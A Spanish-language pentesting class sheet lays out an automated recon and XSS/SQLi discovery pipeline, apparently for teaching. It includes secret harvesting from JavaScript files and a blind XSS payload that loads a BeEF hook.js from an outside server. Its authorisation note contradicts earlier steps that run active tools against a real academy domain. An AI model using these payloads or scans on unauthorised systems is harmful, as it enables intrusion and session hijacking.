# Comandos — Módulo 3 · Clase 1
## Recon Automatizado & Discovery de Vulnerabilidades

> **Target de práctica (recon pasivo/externo):** `educacionit.com` (academia de IT — solo pasivo, sin enumeración activa/explotación, ver nota al final)
> **Target de la Demo 0 en vivo (deck):** `dvwa.labs.manuel-roldan.cloud` (lab propio, autenticado — ver nota de cookie abajo)
> **Objetivo:** mapear la superficie de ataque, encontrar parámetros y candidatos a XSS/SQLi

---

## 🗺️ Fase 1 — Descubrir subdominios activos

```bash
# Enumerar subdominios con subfinder
subfinder -d educacionit.com -silent -o subdominios.txt

# Filtrar solo los que responden HTTP/HTTPS (descartar hosts muertos)
# En Kali usar httpx-toolkit en lugar de httpx
httpx-toolkit -l subdominios.txt -silent -p 80,443,8080 -o vivos.txt
```

> 💡 `httpx-toolkit` descarta subdominios que no responden, reduciendo el ruido en el pipeline.

---

## 🌐 Fase 2 — Recolectar URLs (históricas + activas)

```bash
# URLs históricas desde Wayback Machine, CommonCrawl, OTX, URLScan
cat vivos.txt | gau --threads 200 --o urls_pasivas.txt

# URLs activas: katana crawlea el sitio en tiempo real, incluyendo JavaScript (-jc)
katana -u vivos.txt -d 3 -jc -silent -o urls_activas.txt

# Combinar ambas listas (dedup real lo hace uro en la Fase 3, un sort -u alcanza acá)
cat urls_pasivas.txt urls_activas.txt | sort -u > todas_las_urls.txt
```

> 💡 `gau` = pasado (historial), `katana` = presente (crawl en vivo). Usarlos juntos maximiza cobertura.

**Sobre un target con login (ej. DVWA en la Demo 0 del deck):** sin sesión autenticada, `katana` solo ve la página de login. Hay que loguearse primero en el browser, copiar la cookie de sesión, y pasarla con `-H`:

```bash
katana -u https://dvwa.labs.manuel-roldan.cloud -d 2 \
  -H "Cookie: security=low; PHPSESSID=<tu_session_id>" -o urls_activas.txt
```

---

## 🧹 Fase 3 — Limpiar y deduplicar

```bash
# uro elimina URLs que son del mismo patrón (ej: ?id=1, ?id=2, ?id=3 → guarda solo una)
cat todas_las_urls.txt | uro -o urls_limpias.txt
```

> 💡 Sin `uro` podés terminar con miles de URLs que son básicamente la misma. Reduce el set a patrones únicos.

---

## 🔍 Fase 4 — Extraer secretos desde archivos JavaScript

```bash
# Filtrar solo archivos .js del output de katana
cat urls_limpias.txt | grep -E "\.js$" >> archivos_js.txt

# jsleak analiza cada JS buscando:
# -l links (endpoints y rutas internas)
# -s secrets (API keys, tokens, passwords hardcodeados)
# -c 150 = 150 workers concurrentes
cat archivos_js.txt | jsleak -l -s -c 150 | tee secretos_js.txt
```

> 💡 Es sorprendente cuántas apps tienen API keys o endpoints internos dentro del JS del frontend.

---

## 🎯 Fase 5 — Filtrar por patrón y descubrir parámetros ocultos

```bash
# gf aplica patrones grep para clasificar candidatos por tipo de vulnerabilidad
cat urls_limpias.txt | gf xss  > candidates_xss.txt
cat urls_limpias.txt | gf sqli > candidates_sqli.txt

# arjun fuzzea cada endpoint buscando parámetros no documentados
# -i archivo de entrada, --rate-limit cuida no tumbar el target
arjun -i urls_limpias.txt --rate-limit 10 -o parametros_ocultos.txt
```

> 💡 Muchos parámetros vulnerables no aparecen en la URL pública — están ocultos. arjun los descubre por fuerza bruta.

---

## 🧨 Fase 6 — Fuzzing de rutas con ffuf

```bash
# Directory/file discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```

> 💡 Útil para encontrar rutas que ni `gau` ni `katana` indexaron (nunca enlazadas, nunca crawleadas).

---

## ⚡ Fase 7 — Detección de XSS

```bash
# kxss: detecta qué parámetros reflejan caracteres especiales sin sanitizar
cat candidates_xss.txt | kxss

# Gxss: más preciso para SPAs modernas, valida el contexto JS exacto de la reflexión
cat candidates_xss.txt | Gxss -p q

# bxss: Blind XSS — para payloads que se ejecutan en paneles admin fuera de tu vista
cat candidates_xss.txt | bxss \
  -payload '"><script src=https://beef.labs.manuel-roldan.cloud/hook.js><\/script>' \
  -parameters

# dalfox: scanner de XSS automatizado, genera y verifica payloads (incluye DOM XSS con headless Chrome)
dalfox file candidates_xss.txt --blind https://beef.labs.manuel-roldan.cloud/hook.js
```

> 💡 `kxss`/`Gxss` detectan reflexión (candidatos). `dalfox` confirma explotación. `bxss` cubre el caso ciego (panel admin que no ves).

---

## 🔬 Fase 8 — Scanner de vulnerabilidades con Nuclei

```bash
# Templates básicos contra la lista completa
nuclei -l urls_limpias.txt -t exposures/ -t vulnerabilities/ -o resultados_nuclei.txt

# Solo severidad alta/crítica, tags específicos
nuclei -l urls_limpias.txt -tags xss,sqli -severity medium,high
```

> 💡 Nuclei tiene miles de templates para XSS, SQLi, SSRF, LFI, misconfigs, CVEs, etc. Rápido pero genera falsos positivos — siempre validar con Burp.

---

## 🔗 Pipeline completo (Demo 0 del deck, contra DVWA)

```bash
# 1. Crawl autenticado del target
katana -u https://dvwa.labs.manuel-roldan.cloud -d 2 \
  -H "Cookie: security=low; PHPSESSID=<tu_session_id>" -o urls.txt

# 2. Deduplicar
cat urls.txt | uro -o clean.txt

# 3. Filtrar candidatos
cat clean.txt | gf xss  > xss.txt
cat clean.txt | gf sqli > sqli.txt

# 4. Detectar reflexión XSS
cat xss.txt | kxss

# 5. Buscar parámetros ocultos
arjun -i clean.txt --rate-limit 5 -o params.txt

# 6. Escanear con nuclei
nuclei -l clean.txt -tags xss,sqli -severity medium,high
```

---

## 🛠️ Herramientas usadas en esta clase

| Herramienta | Función | Instalación |
|---|---|---|
| `subfinder` | Enumeración de subdominios | `brew install subfinder` / `apt install subfinder` |
| `httpx-toolkit` | Probe HTTP (hosts vivos) | `brew install httpx` / `apt install httpx-toolkit` |
| `gau` | URLs históricas pasivas | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| `katana` | Crawler activo + JS | `brew install katana` |
| `uro` | Deduplicar patrones URL | `pip3 install uro` |
| `jsleak` | Secretos/links en JS | `go install github.com/byt3hx/jsleak@latest` |
| `gf` | Filtrar URLs por patrón de vuln | `go install github.com/tomnomnom/gf@latest` |
| `arjun` | Descubrir params ocultos | `pip3 install arjun` |
| `ffuf` | Fuzzing de directorios/parámetros | `go install github.com/ffuf/ffuf/v2@latest` |
| `kxss` | Detectar reflejos XSS | `go install github.com/Emoe/kxss@latest` |
| `Gxss` | Reflexión XSS en contexto JS (SPAs) | `go install github.com/KathanP19/Gxss@latest` |
| `bxss` | Blind XSS (paneles fuera de vista) | `go install github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest` |
| `dalfox` | Scanner XSS automatizado + DOM | `go install github.com/hahwul/dalfox/v2@latest` |
| `nuclei` | Scanner de vulns por templates | `brew install nuclei` |

> 📦 **Patrones GF:** https://github.com/d4rkrex/GF-patterns
> Clonar en `~/.gf/` para que `gf xss`, `gf sqli`, etc. funcionen.

---

## Nota sobre `educacionit.com`

Solo reconocimiento **pasivo** (subfinder, gau — fuentes públicas, sin tocar el target directamente). No correr `httpx-toolkit` activo, `katana`, `ffuf`, `arjun`, `nuclei` ni cualquier fuzzing/explotación contra ese dominio sin autorización explícita del instituto. El pipeline completo activo (Fases 2 en adelante con katana, Fase 6-8) es solo contra labs propios (`*.labs.manuel-roldan.cloud`).
